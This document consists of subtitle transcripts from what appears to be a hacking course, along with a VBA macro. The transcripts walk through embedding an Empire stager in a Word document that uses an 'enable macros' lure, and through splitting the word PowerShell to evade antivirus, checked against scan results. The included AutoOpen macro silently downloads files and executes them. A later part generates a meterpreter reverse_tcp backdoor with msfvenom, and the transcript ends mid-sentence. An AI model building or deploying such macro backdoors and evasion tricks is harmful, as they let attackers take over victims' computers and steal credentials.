━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,060  -->  00:00:06,600
So far we've seen how to make our backdoors or evil files look and function

2

00:00:06,800  -->  00:00:12,740
like a file that the target person trusts, like an image or a PDF or any other file type.

3

00:00:13,580  -->  00:00:17,260
We did this using our download and execute payload

4

00:00:17,540  -->  00:00:22,660
and we configured that payload to download two files to download our evil file

5

00:00:22,860  -->  00:00:26,220
and to download an image or the PDF that the person sees.

6

00:00:26,560  -->  00:00:33,320
Then, it executes the file that the person sees and it executes our evil file in the background.

7

00:00:34,860  -->  00:00:42,100
So the end product was an executable that functions like a normal image or a normal PDF.

8

00:00:42,880  -->  00:00:49,280
We then had to change the icon of that file to reflect the type of file that we are trying to spoof.

9

00:00:49,460  -->  00:00:53,040
And we had to spoof the file extension or the file name.

10

00:00:54,960  -->  00:00:57,380
Again, we didn't really change the file name,

11

00:00:57,560  -->  00:01:01,860
we just made it look like it's the file name that the target person is expecting.

12

00:01:03,640  -->  00:01:10,880
In this lecture I'd like to show you a way of embedding the backdoor itself in a file that the person trusts.

13

00:01:11,420  -->  00:01:13,360
So we're not gonna be using an executable,

14

00:01:13,860  -->  00:01:18,480
we're actually gonna be embedding the evil code inside a normal file

15

00:01:18,740  -->  00:01:23,240
and we're gonna get that evil code to be executed inside that file.

16

00:01:24,560  -->  00:01:30,080
And to do that we're gonna rely on a feature that's available in Microsoft Office.

17

00:01:31,820  -->  00:01:37,680
So Microsoft Office allows you to run executable VBA code inside their documents,

18

00:01:37,920  -->  00:01:41,760
whether it's a word document, whether it's a PowerPoint or Excel document.

19

00:01:42,380  -->  00:01:47,780
So what we're gonna do is we're gonna use that feature to put some evil code in there

20

00:01:48,240  -->  00:01:51,620
and then when the person run, runs this normal document,

21

00:01:52,260  -->  00:01:55,680
our evil code will be executed with that document.

22

00:01:55,920  -->  00:01:58,860
So the file will not be an executable.

23

00:01:59,100  -->  00:02:03,299
We won't have to change the extension or the icon of the file.

24

00:02:03,300  -->  00:02:09,200
It's literally gonna be a valid Microsoft Office file that has evil code inside it

25

00:02:09,560  -->  00:02:14,780
and when the target person runs this file, our evil code will run the background as well.

26

00:02:15,760  -->  00:02:20,140
Now Empire made this really easy for us as it can generate macros,

27

00:02:20,500  -->  00:02:26,540
which are basically made of the code that we can embed inside Microsoft Office documents.

28

00:02:27,180  -->  00:02:32,440
And we can generate macros the same way that we were generating did, bat, backdoors.

29

00:02:33,360  -->  00:02:35,920
So all you have to do is do 'usestager'.

30

00:02:37,440  -->  00:02:43,480
And if we double Tab, you'll see that the
one that we always used was windows launcher bat,

31

00:02:44,360  -->  00:02:48,380
and what we want to use this time is Windows macro.

32

00:02:49,160  -->  00:02:57,140
So I'm just gonna type that and then we're gonna do 'info' to see the settings that we can change

33

00:02:57,980  -->  00:03:02,220
and the most important thing that we wanna change is the listener right here.

34

00:03:02,500  -->  00:03:07,280
So you wanna set that to the name of your listener and as you remember from the first time

35

00:03:07,420  -->  00:03:11,740
we used Empire, I created a listener called 'HTTP'.

36

00:03:12,160  -->  00:03:19,679
So I'm gonna set my listener to HTTP and then I'm gonna set the location

37

00:03:19,680  -->  00:03:24,240
where my macro's gonna be stored and I'm just gonna store it in my evil files

38

00:03:24,240  -->  00:03:26,680
even though this is not really gonna be an evil file.

39

00:03:27,100  -->  00:03:30,120
We'll just start it in there, so we can access it in the Windows machine.

40

00:03:31,040  -->  00:03:42,780
So I'm gonna 'set Out file' to 'var/www/html/ files' and I'm gonna call that 'http_8080_macro'.

41

00:03:43,820  -->  00:03:48,860
If I do 'info' again, you'll see our settings have been configured correctly

42

00:03:49,360  -->  00:03:54,460
and now, I'm gonna do 'execute' to generate my macro.

43

00:03:55,220  -->  00:04:04,820
Now, you can see it it's telling us that the stager is stored in 'var/www/html/evil-files/http_8080_macro'.

44

00:04:05,800  -->  00:04:07,480
Now let's go to the Windows machine

45

00:04:08,820  -->  00:04:15,340
and I'm gonna go to where my evil files are there at 10.20.14.2013/evil-files

46

00:04:16,000  -->  00:04:17,800
and we can see our macro in here.

47

00:04:18,840  -->  00:04:25,000
So if we click that you'll see we just have the code that we can embed in Microsoft Office.

48

00:04:25,200  -->  00:04:30,380
So this is not a launcher, we can't really just double click this to get our Reverse Shell.

49

00:04:31,000  -->  00:04:37,540
We have to copy this and then embed it inside a Microsoft Office document.

50

00:04:39,060  -->  00:04:41,900
Now, I'm gonna show you how to use it with Microsoft Word

51

00:04:42,260  -->  00:04:47,760
but you can use it with other Microsoft Office products, like Excel or PowerPoint.

52

00:04:48,540  -->  00:04:53,060
So I'm gonna copy everything and then I'm gonna open my Microsoft Word.

53

00:04:55,760  -->  00:05:02,340
And I'm gonna create a blank document and here you wanna type a message.

54

00:05:02,340  -->  00:05:06,800
You can actually have a normal content to make the target person trust this document

55

00:05:07,440  -->  00:05:10,520
and you can also just type a message telling the person

56

00:05:10,700  -->  00:05:13,340
to please enable macros to see the full content.

57

00:05:14,020  -->  00:05:16,837
You can even have an image to demonstrate how to enable that.

58

00:05:17,540  -->  00:05:22,900
For now I'm just gonna have a simple message saying please enable macros to see the full document.

59

00:05:24,460  -->  00:05:26,480
And missed an 'e' in here.

60

00:05:27,880  -->  00:05:35,000
Now to embed the evil code, I'm gonna go to view and click on this little arrow for the macros.

61

00:05:35,800  -->  00:05:44,340
I'm gonna click on View macros then I'm gonna go and select the macros in document 1,

62

00:05:44,380  -->  00:05:46,820
which is the document that I'm using at the moment.

63

00:05:48,900  -->  00:05:54,800
I'm gonna click on create to create a new macro then I'm gonna highlight everything.

64

00:05:55,760  -->  00:06:02,620
Delete it and paste the code that I just copied from the macro that we created with Empire.

65

00:06:04,980  -->  00:06:05,900
So that's all done.

66

00:06:06,040  -->  00:06:08,660
We don't really need to even look at this code and know what it does

67

00:06:09,000  -->  00:06:13,420
but this is basically our evil code encoded in Base64

68

00:06:14,140  -->  00:06:17,120
and you can see here we have the PowerShell command

69

00:06:17,200  -->  00:06:20,320
that will actually execute the code that follows that.

70

00:06:21,980  -->  00:06:27,500
So I'm gonna save this and I'm gonna store it in--

71

00:06:27,500  -->  00:06:31,460
Let's just put it in my downloads anyway because that's where we're looking at the moment

72

00:06:33,500  -->  00:06:39,980
and let's just call it empire macro backdoor.

73

00:06:40,620  -->  00:06:46,600
Now, you wanna also set the save as type to Word 97-2003.

74

00:06:49,440  -->  00:06:52,040
If you keep it at docx, it won't work.

75

00:06:52,380  -->  00:06:55,740
So make sure you set it Word 97-2003.

76

00:06:56,720  -->  00:07:00,220
Save that and that's it, we're good to go.

77

00:07:00,720  -->  00:07:04,820
Now, you're gonna have to deliver this depending on your target person,

78

00:07:04,823  -->  00:07:08,460
depending on the information that you gathered on that target person.

79

00:07:09,320  -->  00:07:13,060
Once the target person gets that file, they'll see it right here.

80

00:07:13,580  -->  00:07:18,000
You can see that it looks exactly like a Word document because it is a Word document.

81

00:07:18,300  -->  00:07:23,080
So it has a Word document icon, it has a Word document extension .doc.

82

00:07:23,080  -->  00:07:28,560
So it's not an executable, even if you go on the properties you'll see that it's a normal document,

83

00:07:28,980  -->  00:07:33,120
it's and it's a normal document that's gonna be opened by Microsoft Office.

84

00:07:33,740  -->  00:07:39,080
So it's really not suspicious at all but then when you double-click this,

85

00:07:40,940  -->  00:07:46,780
you'll see this warning right here telling you that you have to enable the content for the full file.

86

00:07:47,460  -->  00:07:52,120
And we included the message saying, 'Please enable macros to see the full document'.

87

00:07:53,040  -->  00:07:59,420
So if the target person enables this content, this will execute our evil code

88

00:07:59,680  -->  00:08:06,000
and if we come here at our Kali machine, you'll see that we got an agent trying to connect back to us.

89

00:08:06,660  -->  00:08:10,520
So if we go to agents, you can see that we have a connection

90

00:08:10,840  -->  00:08:16,180
and we can interact with it and do 'sysinfo' to confirm.

91

00:08:18,560  -->  00:08:23,600
And as you can see we managed to gain full control over the Windows machine.

92

00:08:23,980  -->  00:08:25,040
I'm inside it now.

93

00:08:25,040  -->  00:08:26,500
I can do whatever I want

94

00:08:26,760  -->  00:08:30,380
and we managed to do this using a normal Microsoft document

95

00:08:30,780  -->  00:08:35,780
that looks and functions just like any other Microsoft Office document.

96

00:08:36,480  -->  00:08:38,960
And again, you can do this method not only with Word

97

00:08:39,340  -->  00:08:45,200
but you can do it with other products by Microsoft Office such as Excel and PowerPoint.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,140  -->  00:00:05,960
Now the backdoor that we created in the
previous lecture is pretty cool,

2

00:00:06,500  -->  00:00:12,219
The only problem is it gets detected by a lot of antivirus programs as you can see here,

3

00:00:12,500  -->  00:00:16,260
it's getting detected by 13 antivirus programs.

4

00:00:17,320  -->  00:00:21,940
Now, you can play around with its code like I showed you before, removing line by line.

5

00:00:21,940  -->  00:00:28,300
Now, you can't really mess around with these lines because this is the lines for the evil code of the payload,

6

00:00:28,300  -->  00:00:33,300
so you don't really wanna play with these but you can play with the options here,

7

00:00:33,300  -->  00:00:36,640
you can divide the strength like I'm gonna show you in a bit

8

00:00:37,200  -->  00:00:40,100
and you can even remove these lines one by one.

9

00:00:40,400  -->  00:00:43,940
Even if you don't know what they mean, you can research what they mean

10

00:00:43,940  -->  00:00:49,720
or you can remove them one by one and see which ones are actually affecting the execution of the program

11

00:00:49,940  -->  00:00:52,820
and see if you can bypass more antiviruses with that.

12

00:00:54,260  -->  00:01:01,980
All of this is possible but what I wanna show you in this lecture is another method of running macros

13

00:01:02,260  -->  00:01:05,120
and it's actually a better more generic way.

14

00:01:06,520  -->  00:01:13,000
I'm saying this because this macro right here, can only be used to hack into the target computer

15

00:01:13,220  -->  00:01:18,320
and as we've seen before it was generated for us by Empire.

16

00:01:18,680  -->  00:01:23,840
So, we're fully dependent on Empire to be able to run these kind of attacks.

17

00:01:24,620  -->  00:01:28,480
Now the method that I'm gonna show you now, is more generic

18

00:01:28,480  -->  00:01:32,780
because it allows you to run any executable that you want.

19

00:01:32,940  -->  00:01:38,360
So the executable that we're gonna be running doesn't have to be generated by Empire,

20

00:01:38,420  -->  00:01:44,080
so we're gonna be able to run Vlogger, LaZagne, the backdoors generated by Veil

21

00:01:44,220  -->  00:01:46,540
or any other executable that you can think of.

22

00:01:47,500  -->  00:01:53,420
And to do that, we're gonna be using my favorite payload which is the 'download and execute payload'.

23

00:01:54,080  -->  00:01:56,720
It's a modified version of that payload actually

24

00:01:57,040  -->  00:02:00,500
and I'm gonna include it in the resources of this lecture

25

00:02:00,780  -->  00:02:05,900
but I already have it downloaded here in my 'Downloads' and that's it right here,

26

00:02:05,900  -->  00:02:07,820
it's called 'download-and-execute'.

27

00:02:08,560  -->  00:02:09,740
I'm gonna open that.

28

00:02:11,760  -->  00:02:17,180
And it's actually the same code that we used in the 'download-and-execute batch script'.

29

00:02:17,980  -->  00:02:21,760
The only difference is, I added one more function at the end

30

00:02:22,380  -->  00:02:26,060
and instead of just literally executing the code directly,

31

00:02:26,540  -->  00:02:29,500
I'm writing the code as text as a string

32

00:02:29,980  -->  00:02:33,840
and then I'm executing it using a VBA function.

33

00:02:35,100  -->  00:02:41,080
So basically, the whole code that we use in the batch script is written as text in here

34

00:02:41,080  -->  00:02:44,320
and as you can see it's enclosed between the quotation marks.

35

00:02:45,180  -->  00:02:50,480
And then at the end of all of this text, I'm executing it using a VBA script.

36

00:02:51,440  -->  00:02:53,680
Now this is again not a programming course,

37

00:02:53,980  -->  00:02:57,500
so I'm just going over this, so you understand what's happening

38

00:02:57,800  -->  00:03:01,380
but I don't wanna go into detail of what, what's happening in here

39

00:03:01,380  -->  00:03:06,460
because a lot of people would be distracted and they won't know what's happening

40

00:03:06,460  -->  00:03:08,940
because we didn't really cover the basics of programming.

41

00:03:09,980  -->  00:03:15,040
So I'm gonna use this exactly the same way that we used the macro before,

42

00:03:15,040  -->  00:03:18,920
so I'm gonna copy the macro code, I'm gonna open Microsoft Word.

43

00:03:23,340  -->  00:03:24,900
I'm gonna create a blank document.

44

00:03:25,440  -->  00:03:28,820
I'm gonna say, "Please open my-- enable macros.'

45

00:03:30,240  -->  00:03:31,980
Then, I'm gonna go to 'View'.

46

00:03:33,440  -->  00:03:37,000
I'm gonna go on 'Macros', 'View Micros'

47

00:03:37,420  -->  00:03:40,240
I'm gonna select the 'Macros in the Current Document',

48

00:03:40,800  -->  00:03:42,640
I'm gonna create a new one.

49

00:03:43,460  -->  00:03:46,740
I'm gonna highlight everything and paste my macro.

50

00:03:48,540  -->  00:03:52,960
Now if you look at the code here, I'm actually starting with PowerShell

51

00:03:53,500  -->  00:03:59,820
but what I did is, I actually splitted the word PowerShell into three parts

52

00:03:59,820  -->  00:04:06,940
because that allows me to bypass about 7 antivirus programs, literally just split in PowerShell like this.

53

00:04:08,040  -->  00:04:13,040
So, I'm using a variable and you can just think of this as a container that contains text

54

00:04:13,580  -->  00:04:18,260
and then I'm putting the code that we used in the download-and-execute batch script,

55

00:04:18,640  -->  00:04:21,340
inside this container that's called 'cc'.

56

00:04:22,120  -->  00:04:25,580
So at the start, I put-- I made cc="pow"

57

00:04:26,460  -->  00:04:31,440
and then I made 'cc=cc', so basically, "pow"

58

00:04:31,700  -->  00:04:35,600
and then "ers" so that, so that's 'powers so far'.

59

00:04:36,280  -->  00:04:39,740
Then, I added "hell" to it at the end, so that's PowerShell

60

00:04:40,280  -->  00:04:44,920
and then there is a space and then there is the arguments that were using with PowerShell.

61

00:04:46,200  -->  00:04:48,560
And then there is the first line of the code

62

00:04:49,440  -->  00:04:54,500
and if you remember we used to change this to the files that we want to download and execute.

63

00:04:55,560  -->  00:04:58,600
So in this case, I'm downloading a PDF

64

00:04:58,900  -->  00:05:02,060
and I'm downloading an image right here.

65

00:05:03,220  -->  00:05:06,000
Now, I don't want to do that I actually wanna download the back door,

66

00:05:06,240  -->  00:05:07,660
so I'm going to remove this.

67

00:05:09,500  -->  00:05:11,680
And I'm going to remove this as well.

68

00:05:14,220  -->  00:05:19,180
And I'm gonna get a code and I'm gonna get a direct URL for one of my backdoors.

69

00:05:20,200  -->  00:05:25,560
And just for simplicity, I'm gonna use the backdoor generated by Empire

70

00:05:25,960  -->  00:05:28,160
and I'm gonna use the silent one right here,

71

00:05:28,420  -->  00:05:32,740
so 'Empire_http_8080.exe' not '.bat'

72

00:05:34,380  -->  00:05:35,460
I'm gonna copy the link,

73

00:05:36,460  -->  00:05:37,820
go back to my Word

74

00:05:38,400  -->  00:05:39,820
and paste that in here.

75

00:05:41,620  -->  00:05:47,260
And in here, I have the code that loops over the files to be downloaded and executed.

76

00:05:48,460  -->  00:05:51,420
Then I'm going to download the files,

77

00:05:51,880  -->  00:05:55,880
execute them and then that's the end of 'cc'.

78

00:05:56,500  -->  00:06:01,320
Again 'cc' just a container that, that contains text so far

79

00:06:01,920  -->  00:06:04,760
and the text that stored in it, is this text,

80

00:06:04,889  -->  00:06:10,027
which is the code that I used in the batch script in the download-and-execute batch script

81

00:06:10,027  -->  00:06:11,340
that we've seen before.

82

00:06:13,960  -->  00:06:22,080
At the end of all of this, I'm using one VBA function and that function executes 'cc' as a command

83

00:06:22,220  -->  00:06:26,560
so it literally takes all the text that's stored in 'cc'

84

00:06:26,740  -->  00:06:28,520
and execute it as a command.

85

00:06:29,380  -->  00:06:35,600
So at the end of the day, this is gonna be executed exactly like my download-and-execute code.

86

00:06:37,140  -->  00:06:42,140
The cool thing about this is again, we can use it to download and execute anything.

87

00:06:42,240  -->  00:06:44,100
So we're not limited to Empire.

88

00:06:44,660  -->  00:06:49,680
And it's also gonna bypass pretty much all antivirus programs

89

00:06:49,840  -->  00:06:51,800
and I'm gonna show you the report in a minute.

90

00:06:52,600  -->  00:06:54,280
Now, let's save this first.

91

00:06:57,180  -->  00:06:58,340
And let's call it,

92

00:07:00,160  -->  00:07:04,600
'download and execute macro'.

93

00:07:06,200  -->  00:07:11,620
and we're gonna call, we're gonna store this as a 2003 like I said, document

94

00:07:12,100  -->  00:07:14,420
and I'm gonna put that in my Downloads.

95

00:07:17,100  -->  00:07:18,420
Gonna save it there.

96

00:07:20,300  -->  00:07:21,840
And then we're gonna go to 'Downloads'.

97

00:07:23,080  -->  00:07:24,900
I'm actually going to close it in here.

98

00:07:28,860  -->  00:07:32,620
And we have it 'download-and-execute' right here, I'm gonna double-click it.

99

00:07:33,560  -->  00:07:36,140
It's gonna start normal Microsoft Word document,

100

00:07:36,400  -->  00:07:38,160
I'm gonna 'Enable the Content'

101

00:07:38,580  -->  00:07:40,680
and if we go to Kali,

102

00:07:41,260  -->  00:07:45,320
you'll see that we got our connection and we can 'interact' with it.

103

00:07:47,200  -->  00:07:48,780
And we can do 'sysinfo'.

104

00:07:50,800  -->  00:07:54,360
And as you can see, now we managed to hack into the Windows machine,

105

00:07:54,640  -->  00:07:58,300
using the download and execute script that we used to use.

106

00:07:59,140  -->  00:08:04,180
Again this is really handy because this script can be used to download and execute anything,

107

00:08:04,380  -->  00:08:09,880
that means we can download and execute Keyloggers, LaZagne, all the other programs that we want

108

00:08:09,880  -->  00:08:12,740
and we're not limited to Empire.

109

00:08:13,620  -->  00:08:17,100
It also bypasses much more antivirus programs than Empire,

110

00:08:17,500  -->  00:08:19,360
so if I go to 'NoDistribute'.

111

00:08:23,940  -->  00:08:25,180
And scan the file.

112

00:08:35,700  -->  00:08:41,780
Now as you can see, it bypassed pretty much all antivirus programs except for three of them,

113

00:08:42,380  -->  00:08:48,420
Whereas, in the macro that was generated by Empire, it was detected by 13 antivirus programs.

114

00:08:49,560  -->  00:08:54,520
The good thing about these three antivirus programs is that all of them are not known,

115

00:08:54,520  -->  00:08:57,580
except for Kaspersky, which is a known one.

116

00:08:58,360  -->  00:09:01,100
The other one that's des-- detecting it, which is Avast

117

00:09:01,320  -->  00:09:05,840
and Avast was actually detecting pretty much all macros,

118

00:09:06,000  -->  00:09:09,760
like even macros that did not have any malicious code,

119

00:09:09,900  -->  00:09:12,060
they were actually getting detected by Avast.

120

00:09:12,520  -->  00:09:17,160
I tried creating blank macros or macros just that, just executes normal stuff

121

00:09:17,440  -->  00:09:20,020
and they were still being detected as harmful files.

122

00:09:21,980  -->  00:09:28,000
Same with Dr.Web, it was still detecting a lot of macros as harmful, even though that they weren't.

123

00:09:28,900  -->  00:09:32,940
So the only one that you might worry about is Kaspersky, it's detecting this

124

00:09:33,320  -->  00:09:37,360
but all the other famous antivirus programs are not being able

125

00:09:37,540  -->  00:09:40,280
to detect our download and execute backdoor.

126

00:09:42,560  -->  00:09:47,100
So again this is a really cool method, it's generic, it can be used to

127

00:09:47,360  -->  00:09:52,860
download and execute any executable, inside the Microsoft Office document.

128

00:09:53,000  -->  00:09:58,040
So it's not even a file that looks or functions like a Microsoft Office document,

129

00:09:58,040  -->  00:10:00,800
it's a proper document made by Office,

130

00:10:01,140  -->  00:10:05,440
opens in Office, it has an Office extension, it has an Office icon

131

00:10:05,720  -->  00:10:09,320
and it'll run evil code that'll allow us to

132

00:10:09,580  -->  00:10:13,980
pretty much do whatever we want, gain access to the computer, install a Keylogger,

133

00:10:14,420  -->  00:10:18,880
send the credentials that saved in that file or anything that you really want.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Sub AutoOpen()
    Dim cc As String
    cc = "pow"
    cc = cc + "ers"
    cc = cc + "hell "
    cc = cc + "-NoP -NonI -W Hidden """
    
    cc = cc + "('url1','url2')"
    
    cc = cc + "|foreach{$fileName=$env:temp+'\'+(Split-Path -Path $_ -Leaf);"
    
    cc = cc + "(new-object System.Net.WebClient).DownloadFile($_,$fileName);"
    
    cc = cc + "Invoke-Item $fileName;}"
    
    cc = cc + """"

    VBA.CreateObject("WScript.Shell").Run cc, 0

End Sub

1

00:00:00,620  -->  00:00:06,100
Okay. Now, that we know how to generate different types of evil files for Windows machines.

2

00:00:06,580  -->  00:00:08,920
We're gonna move to the Mac OS X section

3

00:00:09,260  -->  00:00:12,380
and we're gonna learn how to generate backdoors for that.

4

00:00:13,220  -->  00:00:16,560
There is one very important note that I want to tell you,

5

00:00:16,740  -->  00:00:20,880
is that I didn't show how to install OS X as a virtual machine

6

00:00:21,040  -->  00:00:24,600
because there is no good way of doing that on VirtualBox,

7

00:00:25,440  -->  00:00:27,460
unless you have a Mac OS computer.

8

00:00:28,260  -->  00:00:31,740
It's very difficult to install OS X as a virtual machine.

9

00:00:32,140  -->  00:00:36,220
There is third-party releases of Hackintosh and stuff like that,

10

00:00:36,480  -->  00:00:39,460
that allow you to install OS X on Windows machines

11

00:00:39,600  -->  00:00:41,380
but I'm not gonna cover that

12

00:00:41,380  -->  00:00:47,280
because there-- it's a grey area whether this is legal or not, so I'm just not going to go over it in this course.

13

00:00:48,080  -->  00:00:53,300
If you do have a Mac OS X machine, then you can test these attacks against it

14

00:00:53,600  -->  00:00:57,980
or you can install a 'Virtual OS X' using Parallels Desktop.

15

00:00:58,860  -->  00:01:03,820
Parallels Desktop is a virtualization program, just like VirtualBox,

16

00:01:03,980  -->  00:01:11,180
it's paid though and you can literally just tap one click, just select that you want to make Mac OS machine

17

00:01:11,300  -->  00:01:13,300
and it'll make a virtual one for you.

18

00:01:14,620  -->  00:01:19,140
It will automatically set it to use a 'bridge connection',

19

00:01:19,420  -->  00:01:23,080
so if I go to my 'settings' now in here.

20

00:01:26,420  -->  00:01:32,780
You'll see that the network is already set to the 'Default Adapter' and that's using a bridged network.

21

00:01:33,920  -->  00:01:37,680
So, to be able to access this from my Kali machine,

22

00:01:38,000  -->  00:01:41,820
I set the Kali machine to use a bridged adapter as well,

23

00:01:41,820  -->  00:01:48,120
so if I go to 'Settings' and 'Network', you'll see that it's using a 'Bridged Adapter' now.

24

00:01:48,800  -->  00:01:51,520
And if I do 'ifconfig' in Kali,

25

00:01:52,100  -->  00:01:57,380
you'll see that my IP address is '192.168.0.34',

26

00:01:58,860  -->  00:02:06,360
which is on the same network as the Mac OS machine, so if I go to my terminal here.

27

00:02:09,000  -->  00:02:10,380
And do 'ifconfig'.

28

00:02:13,680  -->  00:02:17,700
You'll see that its IP is '192.168.0.33'.

29

00:02:18,800  -->  00:02:22,840
Now you don't have to do this, if you are testing this against the real network

30

00:02:22,980  -->  00:02:25,360
or if you just don't want to use bridged connection,

31

00:02:25,460  -->  00:02:31,760
you just need to make sure that the Kali machine and this machine ha-- are on the same network.

32

00:02:31,920  -->  00:02:35,820
So the first three parts of their IP as you can see here is the same.

33

00:02:36,060  -->  00:02:39,060
So for me it's '192.168.0' in here

34

00:02:39,360  -->  00:02:43,680
and then in the Kali machine, it's '192.168.0' as well,

35

00:02:43,780  -->  00:02:48,240
which means that they're both on the same network and then they can communicate with each other.

36

00:02:50,060  -->  00:02:55,760
So, you can just connect the Kali machine using a Wi-Fi Adapter connected to a Wi-Fi network

37

00:02:55,980  -->  00:02:59,520
and then test a real Mac OS machine that's connected to the same network.

38

00:02:59,940  -->  00:03:03,920
The whole point or the main idea is to keep them on the same network.

39

00:03:04,340  -->  00:03:07,940
And like I said in the future, we'll see how we can do this on computers,

40

00:03:08,040  -->  00:03:10,640
that are located in a different network.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,360  -->  00:00:05,500
The first thing that I'd like to show you when it comes to hacking OS X machines,

2

00:00:05,900  -->  00:00:09,760
is how to generate a very basic Meterpreter backdoor.

3

00:00:10,900  -->  00:00:14,420
Now we've seen previously, how to do that using Veil for Windows.

4

00:00:14,860  -->  00:00:20,500
And in this lecture, we're gonna do it for OSX using a tool called 'MSFvenom'.

5

00:00:21,640  -->  00:00:29,080
'MSFvenom' can be used to generate payloads for Windows, OS X, Linux, Android and iOS.

6

00:00:29,080  -->  00:00:36,100
So basically, supports all operating systems and it's actually what Veil uses to generate its payload

7

00:00:36,360  -->  00:00:40,980
but then Veil modify these payloads, wrap them into other programming languages

8

00:00:40,980  -->  00:00:44,960
and encrypts the code to bypass antivirus programs.

9

00:00:46,460  -->  00:00:52,454
So in this section, I'm gonna show you how to use 'MSFvenom' to generate a backdoor for OS X

10

00:00:52,840  -->  00:00:57,960
but the same method can be used to generate backdoors for all operating systems.

11

00:00:59,120  -->  00:01:04,640
So, like usual, if we just do 'msfvenom' followed by '--help',

12

00:01:05,400  -->  00:01:10,940
you'll see a list of all the arguments and the options that you can use with the tool.

13

00:01:11,500  -->  00:01:15,780
You can see the name of the argument, followed by how to use it

14

00:01:15,780  -->  00:01:18,920
and followed by a description of this argument.

15

00:01:19,840  -->  00:01:25,700
Now to list all the payloads that we can use with 'MSFvenom', we can just do 'msfvenom'

16

00:01:27,740  -->  00:01:31,360
followed by '--list' as you can see in here.

17

00:01:32,880  -->  00:01:37,000
So I'm gonna do '--list' and then we're gonna say 'payloads'

18

00:01:38,200  -->  00:01:41,520
because we wanted to list all the available payloads.

19

00:01:41,940  -->  00:01:44,760
So we're doing 'msfvenom --list'

20

00:01:45,380  -->  00:01:48,820
and 'payloads' to see all the payloads that we can use.

21

00:01:50,380  -->  00:01:56,140
Now as you can see this returns a huge list and you can see we have windows backdoors in here,

22

00:01:56,140  -->  00:02:02,454
the ones that start with Windows, if we scroll up you'll see we have 'Solaris backdoors',

23

00:02:02,454  -->  00:02:06,620
we have 'Python backdoors', so these are basically back doors

24

00:02:06,620  -->  00:02:10,340
that work on operating systems that support Python.

25

00:02:10,640  -->  00:02:20,080
So this will include Android, iOS, Linux and OS X, going up you'll see 'php', you'll see 'osx'.

26

00:02:21,680  -->  00:02:25,100
You'll see 'Linux backdoors' here and so on.

27

00:02:25,560  -->  00:02:30,720
So you can take some time looking at these backdoors and you'll see beside each backdoor,

28

00:02:31,040  -->  00:02:34,580
you'll see there is a description of what this backdoor does.

29

00:02:35,480  -->  00:02:41,460
So the one that I wanna use actually today is the 'python/meterpreter/reversed_tcp'.

30

00:02:41,460  -->  00:02:48,080
So it's this one right here and you can see that it tells you that it gonna return a meterpreter server

31

00:02:48,080  -->  00:02:54,140
and python from 2.5-2.7 and 3.1-3.5.

32

00:02:54,340  -->  00:03:00,000
So if your target supports these versions of Python which is most Linux, Android, OS X and iOS machines

33

00:03:00,000  -->  00:03:05,300
like I said before, then this payload will work on these machines.

34

00:03:05,960  -->  00:03:12,960
You'll also see the naming pattern here is exactly the same as the naming pattern used in the multi handler

35

00:03:13,300  -->  00:03:19,760
and it's very similar to the naming pattern used in 'Veil', so the first part is the programming language

36

00:03:19,760  -->  00:03:23,480
or the operating system that the payload works on.

37

00:03:24,020  -->  00:03:29,420
The second part is the payload type and you can see this one is a meterpreter payload

38

00:03:29,900  -->  00:03:35,900
and the third part is the method that's going to be used to facilitate the connection

39

00:03:36,120  -->  00:03:41,260
and we've seen with 'Veil', this used to say 'rev_http' or 'ftcp'.

40

00:03:41,260  -->  00:03:45,780
The only difference here this one says 'reverse_tcp' or 'reverse_http'

41

00:03:45,780  -->  00:03:49,380
so it doesn't use anchor names, it uses the full name.

42

00:03:50,180  -->  00:03:57,040
So this is the payload that we wanna use and I'm gonna copy it and we're gonna go back to our command

43

00:03:57,860  -->  00:03:59,340
and I'm gonna clear this.

44

00:04:00,200  -->  00:04:04,700
And I'm just gonna do 'msfvenom --help' again to get the 'Help' menu

45

00:04:05,940  -->  00:04:11,680
and then what I wanna do now is, see the options that I can use with the payload that I picked.

46

00:04:12,720  -->  00:04:18,420
So to do that regardless of what payload you picked, all you have to do is just do 'msfvenom'

47

00:04:20,060  -->  00:04:22,000
followed by '--payload'

48

00:04:24,580  -->  00:04:29,480
and put the payload that you selected and I've already copied it, so I'm just gonna paste it here.

49

00:04:30,780  -->  00:04:37,100
And then we're gonna type '--payload options' which is shown in here

50

00:04:37,220  -->  00:04:40,960
and that basically tells you that it's gonna show you the payload options.

51

00:04:41,540  -->  00:04:45,260
So I'm gonna do '--payload options'.

52

00:04:47,740  -->  00:04:53,080
Okay, now as you can see we get a big list of the options that we can set for this payload.

53

00:04:54,180  -->  00:04:59,540
These are the advanced options for this payload, so again you can see the option,

54

00:04:59,540  -->  00:05:05,460
you can see it's current setting or the default setting, you can see whether it's required or not

55

00:05:05,800  -->  00:05:08,500
and then you'll see a description of that option.

56

00:05:09,340  -->  00:05:12,280
Now in this lecture, we'll generate in a very basic back door,

57

00:05:12,280  -->  00:05:14,920
so we actually won't be playing around with these options.

58

00:05:15,740  -->  00:05:21,560
The only options that we're gonna be modifying is the required options, which is these ones right here,

59

00:05:22,820  -->  00:05:27,000
and these are very similar to the ones in 'Veil' and in the multi handler.

60

00:05:27,400  -->  00:05:31,380
So 'LHOST' refers to the IP address of my current machine

61

00:05:31,780  -->  00:05:37,240
and 'LPORT' refers to the port that I wanna use to get the connection on.

62

00:05:38,060  -->  00:05:43,440
Again, if you are using a different payload then all you have to do is just read this the description here

63

00:05:43,840  -->  00:05:46,580
and you'll know what each of these options stands for.

64

00:05:47,880  -->  00:05:52,500
So now I'm ready, I know the options that I wanna set and I know the payload that I'm gonna use.

65

00:05:52,800  -->  00:05:58,500
So I'm just gonna press the 'UP' button to go back to my payload, so I'm already doing 'msfvenom'

66

00:05:59,240  -->  00:06:04,840
and I've already selected the payload that I want, which is 'python/meterpreter/reverse_tcp'.

67

00:06:05,540  -->  00:06:10,340
I'm gonna delete the payload options here and I'm gonna set the first required option

68

00:06:10,340  -->  00:06:18,020
which was the 'LHOST' and that's gonna be the IP address of my current Kali machine.

69

00:06:18,920  -->  00:06:22,760
Now, like we seen before we can get the IP address by doing 'ifconfig'

70

00:06:25,700  -->  00:06:28,860
and this is my IP address right now.

71

00:06:29,840  -->  00:06:35,117
Now this IP is different because it's the IP that's connected to the same network

72

00:06:35,120  -->  00:06:37,600
that the OS X machine is connected to.

73

00:06:37,600  -->  00:06:42,900
And the OS X machine is connected to a different network than the one that the Windows machine

74

